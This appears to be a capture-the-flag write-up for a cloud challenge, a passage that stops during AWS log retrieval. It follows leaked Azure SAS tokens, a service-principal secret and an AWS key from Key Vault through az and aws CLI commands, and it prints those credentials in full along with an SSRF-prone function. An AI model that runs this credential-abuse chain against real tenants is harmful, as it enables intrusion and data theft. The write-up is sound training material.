# Secret of Meow Olympurr

## Description

> Jaga reached Meow Olympurr and met some native Meows. While cautious at first, they warmed up and shared that they have recently created a website to promote tourism!\
> However, the young Meows explained that they are not cy-purr security trained and would like to understand what they might have misconfigured in their environments. The young Meows were trying to get two different environments to work together, but it seems like something is breaking....\
> Log a cy-purr security case by invoking the _mysterious_ function and retrieve the secret code!\
> `d2p9lw76n0gfo0.cloudfront.net`

## Finding the Azure Blob Storage

We are provided with a CloudFront page, `https://d2p9lw76n0gfo0.cloudfront.net`.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-05 at 4.31.24 PM.png" alt=""><figcaption></figcaption></figure>

I initially tried scanning the page for any hidden files or directories but didn't have any luck with that. But looking at the 404 error page raised some suspicions as an image failed to load.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-05 at 4.46.18 PM.png" alt=""><figcaption></figcaption></figure>

This is due to mixed content - an HTTP image is being loaded on an HTTP**S** page, and modern browsers do not allow this.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-05 at 4.53.09 PM.png" alt=""><figcaption></figcaption></figure>

The image URL is interesting - it uses a [CORS-Anywhere](https://github.com/Rob--W/cors-anywhere/) proxy running at `http://18.141.147.115:8080` to add CORS headers to the resource from `https://meowolympurr.z23.web.core.windows.net/images/ohno.jpg`.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-05 at 4.49.08 PM.png" alt=""><figcaption></figcaption></figure>

The resource being fetched is an [Azure Blob Storage URL](https://learn.microsoft.com/en-us/azure/storage/common/storage-account-overview) for the `meowolympurr` account. Let's visit the 404 error page again, this time on the `meowolympurr.z23.web.core.windows.net` blob storage.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-05 at 5.14.39 PM.png" alt=""><figcaption></figcaption></figure>

This time, the same error image is fetched with a [Shared Access Signature (SAS)](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview) token, and an HTML comment hints at using the SAS token to access the website's source code.

{% code overflow="wrap" %}
```markup
<img src="images/ohno.jpg?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D"/>

...
                       
<!-- 
  For access to website source codes: 
  https://meowolympurr.blob.core.windows.net?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D
-->
```
{% endcode %}

The content in the `index.html` page is similar to what was hosted on the CloudFront page, except for a new paragraph at the end of the page.

{% code overflow="wrap" %}
```markup
<div class="p-5 text-center bg-light">
  <p class="lead text-muted">Have an event you are interested to host but it is not listed here? Submit it <a href="https://olympurr-app.azurewebsites.net/api/meowvellous">here</a>!</p>
</div>
```
{% endcode %}

## The SSRF Rabbit Hole

This new URL appears to be a dynamic site! All it does is fetch the URL provided in the `url` GET parameter, and return the fetched response.

{% code overflow="wrap" %}
```
Found an interesting event you would like to organise in Meow Olympurr?
Pass the URL as a query string. You will see the submitted information if it is successful. 
e.g. https://olympurr-app.azurewebsites.net/api/meowvellous?url=<INSERT>
```
{% endcode %}

Such an [SSRF](https://portswigger.net/web-security/ssrf) may prove useful, but we are not yet sure of the environment this code is running in, and most importantly, we don't have the source code. Nonetheless, I spent some time trying to hit potential internal resources with the SSRF but had no luck.

Heading over to the root URL of `https://olympurr-app.azurewebsites.net`, we see that this is an [Azure functions](https://learn.microsoft.com/en-us/azure/azure-functions/functions-overview) application.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-05 at 5.41.25 PM.png" alt=""><figcaption></figcaption></figure>

While Azure VMs have access to a metadata server, this is not applicable to a serverless function. It seems that the SSRF itself might not be so useful after all.

## A Very Sassy Challenge

We previously found a SAS token and a hint to access the website's source code, so let's see if we could find the source code of this function somewhere.

Let's start with listing the containers available. We can do this using the [List Containers](https://learn.microsoft.com/en-us/rest/api/storageservices/list-containers2?tabs=azure-ad) operation of the [Blob Service REST API](https://learn.microsoft.com/en-us/rest/api/storageservices/blob-service-rest-api). Simply specify `comp=list`, and append the SAS token:

`https://meowolympurr.blob.core.windows.net/?comp=list&sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D`

This gives us the following list of containers.

```markup
<EnumerationResults ServiceEndpoint="https://meowolympurr.blob.core.windows.net/">
<Containers>
<Container>
<Name>$web</Name>
<Properties>
<Last-Modified>Fri, 18 Nov 2022 03:23:11 GMT</Last-Modified>
<Etag>"0x8DAC914387D8CC7"</Etag>
<LeaseStatus>unlocked</LeaseStatus>
<LeaseState>available</LeaseState>
</Properties>
</Container>
<Container>
<Name>dev</Name>
<Properties>
<Last-Modified>Fri, 18 Nov 2022 03:23:11 GMT</Last-Modified>
<Etag>"0x8DAC91438FC71A6"</Etag>
<LeaseStatus>unlocked</LeaseStatus>
<LeaseState>available</LeaseState>
</Properties>
</Container>
</Containers>
<NextMarker/>
</EnumerationResults>
```

Once we have the container name, we could use the [List Blobs](https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=azure-ad) operation to list the blobs under the specified container. For example, the following lists all blobs under the `$web` container.

`https://meowolympurr.blob.core.windows.net/$web?restype=container&comp=list&sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D`

The `$web` container contains the static files served to us at the start of the challenge.

```markup
<EnumerationResults ServiceEndpoint="https://meowolympurr.blob.core.windows.net/" ContainerName="$web">
<Blobs>
<Blob>
<Name>error.html</Name>

...

</Blobs>
<NextMarker/>
</EnumerationResults>
```

The `dev` container, on the other hand, contained an interesting `readme.md` file.

```markup
<EnumerationResults ServiceEndpoint="https://meowolympurr.blob.core.windows.net/" ContainerName="dev">
<Blobs>
<Blob>
<Name>readme.md</Name>
<Properties>
<Last-Modified>Fri, 18 Nov 2022 03:23:56 GMT</Last-Modified>
<Etag>0x8DAC9145356C5EF</Etag>
<Content-Length>901</Content-Length>
<Content-Type>text/plain</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5/>
<Cache-Control/>
<Content-Disposition/>
<BlobType>BlockBlob</BlobType>
<AccessTier>Hot</AccessTier>
<AccessTierInferred>true</AccessTierInferred>
<LeaseStatus>unlocked</LeaseStatus>
<LeaseState>available</LeaseState>
<ServerEncrypted>true</ServerEncrypted>
</Properties>
</Blob>
</Blobs>
<NextMarker/>
</EnumerationResults>
```

Using the same SAS token, we can head over to `/dev/readme.md` to read it.

{% code overflow="wrap" %}
```markdown
# Meow Olympurr 
One stop service for all fun activites in Meow Olympurr! 
    
All resources are hosted on a single tenant: 83e595f4-f086-4f2f-9de8-d698b6012093

Meows are not cy-purr security trained, but we are willing to learn! 
    
# To do 
1. Consolidate the asset list 
2. Seek advice from Jaga and team when they arrive! 
3. Integrate services 
4. Remove credentials used for debugging access to function app

# Function app - https://olympurr-app.azurewebsites.net/api/meowvellous
SAS token to access the scm-releases container: ?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D

## Credentials for debugging
The following service principal has the same privileges as the function app
Application ID: ee92075f-4ddc-4522-a12c-2bc0ab874c85
Client Secret: kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7
```
{% endcode %}

## I Find Your Lack of Sauce... Disturbing

We are finally one step closer to getting the coveted sauce code for the function app!

It looks like we got our hands on some Azure credentials, and yet another SAS token. Using the tenant ID, application ID and client secret, we can login through the Azure CLI.

```bash
$ az login --service-principal -u ee92075f-4ddc-4522-a12c-2bc0ab874c85 -p kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7 --tenant 83e595f4-f086-4f2f-9de8-d698b6012093
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "83e595f4-f086-4f2f-9de8-d698b6012093",
    "id": "bb11df92-eff5-47b6-b940-a3ce6ded6431",
    "isDefault": true,
    "managedByTenants": [],
    "name": "STF2022",
    "state": "Enabled",
    "tenantId": "83e595f4-f086-4f2f-9de8-d698b6012093",
    "user": {
      "name": "ee92075f-4ddc-4522-a12c-2bc0ab874c85",
      "type": "servicePrincipal"
    }
  }
]
```

The Azure CLI provides a very convenient [resource API](https://learn.microsoft.com/en-us/cli/azure/resource?view=azure-cli-latest) that allows us to list all resources using the `az resource list` command. Here's the result of running that command.

```json
[
  {
    "changedTime": "2022-11-18T03:33:08.162536+00:00",
    "createdTime": "2022-11-18T03:22:43.780421+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/bb11df92-eff5-47b6-b940-a3ce6ded6431/resourceGroups/meow-olympurr-resource-group/providers/Microsoft.Storage/storageAccounts/meowvellousappstorage",
    "identity": {
      "principalId": null,
      "tenantId": null,
      "type": "None",
      "userAssignedIdentities": null
    },
    "kind": "StorageV2",
    "location": "southeastasia",
    "managedBy": null,
    "name": "meowvellousappstorage",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "meow-olympurr-resource-group",
    "sku": {
      "capacity": null,
      "family": null,
      "model": null,
      "name": "Standard_LRS",
      "size": null,
      "tier": "Standard"
    },
    "tags": {},
    "type": "Microsoft.Storage/storageAccounts"
  },
  {
    "changedTime": "2022-11-18T03:33:11.903580+00:00",
    "createdTime": "2022-11-18T03:22:43.745326+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/bb11df92-eff5-47b6-b940-a3ce6ded6431/resourceGroups/meow-olympurr-resource-group/providers/Microsoft.Storage/storageAccounts/meowolympurr",
    "identity": {
      "principalId": null,
      "tenantId": null,
      "type": "None",
      "userAssignedIdentities": null
    },
    "kind": "StorageV2",
    "location": "southeastasia",
    "managedBy": null,
    "name": "meowolympurr",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "meow-olympurr-resource-group",
    "sku": {
      "capacity": null,
      "family": null,
      "model": null,
      "name": "Standard_LRS",
      "size": null,
      "tier": "Standard"
    },
    "tags": {},
    "type": "Microsoft.Storage/storageAccounts"
  }
]
```

It looks like this service principal has access to a different storage account, by the name of `meowvellousappstorage`. After discovering this storage blob name, we can use the provided SAS token to access the `scm-releases` container:

`https://meowvellousappstorage.blob.core.windows.net/scm-releases?restype=container&comp=list&sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D`

This container contains a single ZIP file, `scm-latest-olympurr-app.zip`, which contains the source code of the function.

```markup
<EnumerationResults ServiceEndpoint="https://meowvellousappstorage.blob.core.windows.net/" ContainerName="scm-releases">
<Blobs>
<Blob>
<Name>scm-latest-olympurr-app.zip</Name>
<Properties>
<Creation-Time>Fri, 18 Nov 2022 03:26:09 GMT</Creation-Time>
<Last-Modified>Fri, 18 Nov 2022 03:26:09 GMT</Last-Modified>
<Etag>0x8DAC914A3100599</Etag>
<Content-Length>18616320</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>odp8dya/HBVlw8Ij9/HYFg==</Content-MD5>
<Cache-Control/>
<Content-Disposition/>
<BlobType>BlockBlob</BlobType>
<AccessTier>Hot</AccessTier>
<AccessTierInferred>true</AccessTierInferred>
<LeaseStatus>unlocked</LeaseStatus>
<LeaseState>available</LeaseState>
<ServerEncrypted>true</ServerEncrypted>
</Properties>
</Blob>
</Blobs>
<NextMarker/>
</EnumerationResults>
```

This contains the source code of the function app.

## Goodbye Bill, Hello Jeff

```python
import boto3
import requests
import json

import azure.functions as func
from azure.identity import ManagedIdentityCredential
from azure.keyvault.secrets import SecretClient

functionName = "event-webservice"
keyName = "AKIA5G4XMRW7TLT6XD7R"

def logURL(url):
    identity = ManagedIdentityCredential()
    secretClient = SecretClient(vault_url="https://olympurr-aws.vault.azure.net/", credential=identity)
    secret = secretClient.get_secret(keyName).value
    session = boto3.Session(
        aws_access_key_id=keyName,
        aws_secret_access_key=secret
    )
    
    lambda_client = session.client("lambda", region_name="ap-southeast-1")

    details = {"url" : url}
    lambda_client.invoke(
        FunctionName=functionName,
        InvocationType="RequestResponse",
        Payload=bytes(json.dumps(details), "utf-8")
    )
    return secret

def main(req: func.HttpRequest) -> func.HttpResponse:
    url = req.params.get('url')

    if not url:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            name = req_body.get('url')

    if url:
        # Log the URL in AWS 
        secret = logURL(url)
        try:
            response = requests.get(url)
            return func.HttpResponse(response.text)
        except Exception as e:
            return func.HttpResponse(str(e))
    
    return func.HttpResponse(
            """Found an interesting event you would like to organise in Meow Olympurr?
Pass the URL as a query string. You will see the submitted information if it is successful. 
e.g. https://olympurr-app.azurewebsites.net/api/meowvellous?url=<INSERT>
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠈⠻⣮⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡿⠋⠀⠀⠀⠀⠙⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠿⠿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣠⣤⣤⣀⡀⠀⠀⣀⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⠀⠀
⢀⣤⣾⡿⠟⠛⠛⢿⣿⣶⣾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣀⣀⣤⣶⣿⡿⠿⢿⣿⡀⠀
⣿⣿⠏⠀⢰⡆⠀⠀⠉⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⡿⠟⠋⠁⠀⠀⢸⣿⠇⠀
⣿⡟⠀⣀⠈⣀⡀⠒⠃⠀⠙⣿⡆⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀
⣿⡇⠀⠛⢠⡋⢙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
⣿⣧⠀⠀⠀⠓⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠀⠀⢸⣧⣤⣤⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠀⠀
⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⣷⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁⠀⠀
⠈⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⣶⣤⣤⣀⡀⠀⠀⠀⢀⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⣄
   Send us the details!            ⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣹
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⢸⣧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣤⣄⣀⡀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣻⣷⣶⣾⣿⣿⡿⢯⣛⣛⡋⠁⠀⠀⠉⠙⠛⠛⠿⣿⣿⡷⣶⣿
            """,
            status_code=200
    )

```

Taking a look at the source code, we see that a `secret` is obtained from an Azure [key vault](https://azure.microsoft.com/en-us/products/key-vault/) and used as the secret access key for an AWS session.

As stated previously in the `readme.md`, the service principal account we have access to "has the same privileges as the function app". This means that we should be able to retrieve this secret from the key vault.

```bash
$ az keyvault secret show --name AKIA5G4XMRW7TLT6XD7R --vault-name olympurr-aws
{
  "attributes": {
    "created": "2022-11-18T03:25:20+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "updated": "2022-11-18T03:25:20+00:00"
  },
  "contentType": "",
  "id": "https://olympurr-aws.vault.azure.net/secrets/AKIA5G4XMRW7TLT6XD7R/05c534380f7b480d90dcaffc7364bce6",
  "kid": null,
  "managed": null,
  "name": "AKIA5G4XMRW7TLT6XD7R",
  "tags": {},
  "value": "fgQdSIETJp/yBKwWbmf2SprGa2eXWyqgkeeIdWtL"
}
```

Next, an AWS [lambda function](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html) by the name of `event-webservice` is invoked.

Before we proceed with exploring AWS, we need to log in by configuring the access key ID and secret access key we just found in our AWS CLI.

```
$ aws configure
AWS Access Key ID [****************F6I5]: AKIA5G4XMRW7TLT6XD7R
AWS Secret Access Key [****************AFl2]: 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
Default region name [ap-southeast-1]:
Default output format [None]:

$ aws sts get-caller-identity
{
    "UserId": "AIDA5G4XMRW7UAWT26Q6Q",
    "Account": "908166204863",
    "Arn": "arn:aws:iam::908166204863:user/azure_user"
}
```

Great! Now we can take a look at the user policies attached to our user to gain a better understanding of our privileges.

```bash
$ aws iam list-attached-user-policies --user-name azure_user
{
    "AttachedPolicies": [
        {
            "PolicyName": "azure-policy",
            "PolicyArn": "arn:aws:iam::908166204863:policy/azure-policy"
        },
        {
            "PolicyName": "azure-policy-extended",
            "PolicyArn": "arn:aws:iam::908166204863:policy/azure-policy-extended"
        }
    ]
}

$ aws iam get-policy-version --policy-arn arn:aws:iam::908166204863:policy/azure-policy-extended --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:AddUserToGroup",
                        "iam:AttachUserPolicy",
                        "iam:CreateRole",
                        "iam:AttachRolePolicy",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:ListAttachedUserPolicies",
                        "iam:GetUser"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::908166204863:user/azure_user"
                },
                {
                    "Action": [
                        "lambda:Invoke*",
                        "lambda:ListFunctions",
                        "lambda:CreateFunction",
                        "logs:DescribeLogGroups",
                        "logs:DescribeLogStreams",
                        "logs:GetLogEvents",
                        "lambda:UpdateFunctionCode"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "cloudformation:CreateStack"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-11-18T03:22:31Z"
    }
}
```

As we already know, we can invoke lambda functions. Let's try to invoke the `event-webservice` function to see its output.

{% code overflow="wrap" %}
```json
$ aws lambda invoke --function-name event-webservice --payload '{"url":"http://example.com"}' out.txt
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}

$ cat out.txt
{"statusCode": 200, "headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*"}, "body": "{\"Message\": \"Purrfect!\"}", "isBase64Encoded": false}
```
{% endcode %}

Hmm, this function does not return much useful information. Not providing a valid payload also results in an exception, but we can't see much from the response.

{% code overflow="wrap" %}
```json
{"errorMessage": "'url'", "errorType": "KeyError", "requestId": "ab4a0452-88fd-4d67-92b2-4861ad4f857e", "stackTrace": ["  File \"/var/task/main.py\", line 6, in lambda_handler\n    print(event[\"url\"])\n"]}
```
{% endcode %}

## Log Me In

Three of the actions listed in the policy allow us to retrieve logs from the logs API.

```json
"logs:DescribeLogGroups",
"logs:DescribeLogStreams",
"logs:GetLogEvents"
```

Viewing the logs of the function's execution may provide us with more insights.

To begin, we can list the log groups available. The `/aws/lambda/event-webservice` log group contains the logs of our previously invoked function, but there are several other interesting log groups as well.

```json
$ aws logs describe-log-groups
{
    "logGroups": [
        {
            "logGroupName": "/aws/lambda/agent-webservice",
            "creationTime": 1665202979754,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/agent-webservice:*",
            "storedBytes": 687
        },
        {
            "logGroupName": "/aws/lambda/amplify-stfmobilechalleng-UpdateRolesWithIDPFuncti-LUiAZ9V8Ozui",
            "creationTime": 1661694112426,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechalleng-UpdateRolesWithIDPFuncti-LUiAZ9V8Ozui:*",
            "storedBytes": 964
        },
        {
            "logGroupName": "/aws/lambda/amplify-stfmobilechallenge-pr-UserPoolClientLambda-zd7XTYeuNczP",
            "creationTime": 1661694081981,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechallenge-pr-UserPoolClientLambda-zd7XTYeuNczP:*",
            "storedBytes": 807
        },
        {
            "logGroupName": "/aws/lambda/amplify-stfmobilechallenge-prod-21-RoleMapFunction-iQfrqN7EZzDT",
            "creationTime": 1661694156003,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/amplify-stfmobilechallenge-prod-21-RoleMapFunction-iQfrqN7EZzDT:*",
            "storedBytes": 1123
        },
        {
            "logGroupName": "/aws/lambda/event-webservice",
            "creationTime": 1664456644866,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/event-webservice:*",
            "storedBytes": 333046
        },
        {
            "logGroupName": "/aws/lambda/internal-secret-of-MeowOlympurr-webservice",
            "creationTime": 1664456602816,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:*",
            "storedBytes": 3874
        }
    ]
}
```

The last log group, `/aws/lambda/internal-secret-of-MeowOlympurr-webservice`, is very suspicious indeed! Let's take a look at its log streams.

```json
$ aws logs describe-log-streams --log-group-name /aws/lambda/internal-secret-of-MeowOlympurr-webservice
{
    "logStreams": [
        {
            "logStreamName": "2022/09/29/[$LATEST]89365d3113c74e2b8025c903e929c699",
            "creationTime": 1664456602877,
            "firstEventTimestamp": 1664456598757,
            "lastEventTimestamp": 1664456599885,
            "lastIngestionTime": 1664456602885,
            "uploadSequenceToken": "49631374357748980131057872210468490102701359339921212082",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/09/29/[$LATEST]89365d3113c74e2b8025c903e929c699",
            "storedBytes": 0
        },
        {
            "logStreamName": "2022/11/18/[$LATEST]44ce7a2544da4bfc948f03282b91d0cf",
            "creationTime": 1668780227368,
            "firstEventTimestamp": 1668780224001,
            "lastEventTimestamp": 1668780225039,
            "lastIngestionTime": 1668780227376,
            "uploadSequenceToken": "49635250750640673817660415146841146067518925277000369794",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/11/18/[$LATEST]44ce7a2544da4bfc948f03282b91d0cf",
            "storedBytes": 0
        },
        
        ...
        
        {
            "logStreamName": "2022/12/05/[$LATEST]decfb40844a34bac9b214a0554a66fd6",
            "creationTime": 1670227009203,
            "firstEventTimestamp": 1670227006277,
            "lastEventTimestamp": 1670227014407,
            "lastIngestionTime": 1670227023211,
            "uploadSequenceToken": "49632176992767417780933879553633127728338169758501306658",
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:log-stream:2022/12/05/[$LATEST]decfb40844a34bac9b214a0554a66fd6",
            "storedBytes": 0
        }
    ] 
}
```

The log stream names are in the format `<YYYY>/<MM>/<DD>/[$LATEST]<HASH>`.

There are a bunch of logs from recent runs in November and December, but these all had the same message.

```json
$ aws logs get-log-events --log-group-name /aws/lambda/internal-secret-of-MeowOlympurr-webservice --log-stream-name "2022/11/18/[\$LATEST]44ce7a2544da4bfc948f03282b91d0cf"
{
    "events": [
        {
            "timestamp": 1668780224001,
            "message": "START RequestId: fdf4ec99-a296-4a3a-ad76-bfaae36f00c6 Version: $LATEST\n",
            "ingestionTime": 1668780227376
        },
        {
